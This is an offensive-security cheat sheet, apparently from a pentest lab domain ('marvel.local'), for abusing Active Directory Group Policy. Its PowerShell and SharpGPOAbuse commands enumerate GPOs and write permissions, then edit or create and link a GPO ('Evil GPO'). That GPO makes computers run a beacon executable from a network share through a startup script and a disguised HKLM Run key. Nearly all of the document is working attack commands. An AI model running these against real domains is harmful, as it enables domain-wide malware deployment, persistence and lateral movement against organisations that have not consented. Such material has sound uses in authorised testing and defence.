## Enumeratation

### 1. Enumerate Domain GPOs then Affected OUs then Affected Computers
```powershell
Get-DomainGPO | select displayname,cn,whencreated,whenchanged | fl
Get-DomainOU -GPLink {CE680C75-3791-428D-BE7E-E75DDF297BE4} | % {Get-DomainComputer -SearchBase $_.distinguishedname -Properties dnshostname}
```

### 2. Enumerate Domain GPOs then search for Restricted Groups in GptTmpl.inf & Groups.xml
- Get-GptTmpl "\\{Domain}\SysVol\{Domain}\Policies\{ID}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf"
- Get-GroupsXML "\\{Domain}\SysVol\{Domain}\Policies\{ID}\MACHINE\Preferences\Groups\Groups.xml"
```powershell
Get-DomainGPOLocalGroup
```

### Map User to GPO then Map GPO to Computers (Do Phase2 then Do Phase1)
```powershell
Get-DomainGPOUserLocalGroupMapping -Identity itsupport
```

## Modify Existing GPO
```powershell
Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "CreateChild|WriteProperty" -and $_.SecurityIdentifier -match "S-1-5-21-410602843-3916082903-3170366279-[\d]{4,10}"} | select SecurityIdentifier,ObjectDN,ActiveDirectoryRights,ObjectAceType | fl

Get-DomainGPO -Identity "CN={CE680C75-3791-428D-BE7E-E75DDF297BE4},CN=Policies,CN=System,DC=MARVEL,DC=local"

ConvertFrom-SID "S-1-5-21-410602843-3916082903-3170366279-1119"

SharpGPOAbuse.exe --AddComputerScript --ScriptName startup.bat --ScriptContents "start /b \\hydra-dc.marvel.local\secret\beacon.exe" --GPOName "Add Local Admin Access"
```

## Create & Link a GPO

### Create GPO
```powershell
Get-DomainObjectAcl -Identity "CN=Policies,CN=System,DC=marvel,DC=local" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" -and $_.ActiveDirectoryRights -contains "CreateChild" } | % { ConvertFrom-SID $_.SecurityIdentifier }
```

### Link GPO to OU
```powershell
Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select SecurityIdentifier,ObjectDN,ActiveDirectoryRights,ObjectAceType | fl
```

### Install
```powershell
Get-WindowsCapability -Name RSAT* -Online | Select-Object -Property Name, State
Add-WindowsCapability -Online -Name Rsat.GroupPolicy.Management.Tools~~~~0.0.1.0

New-GPO -Name "Evil GPO"
Get-GPO -Name "Evil GPO" | New-GPLink -Target "OU=PC,DC=marvel,DC=local"

Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater0X" -Value "C:\Windows\System32\cmd.exe /c \\hydra-dc.marvel.local\secret\beacon.exe" -Type ExpandString
```
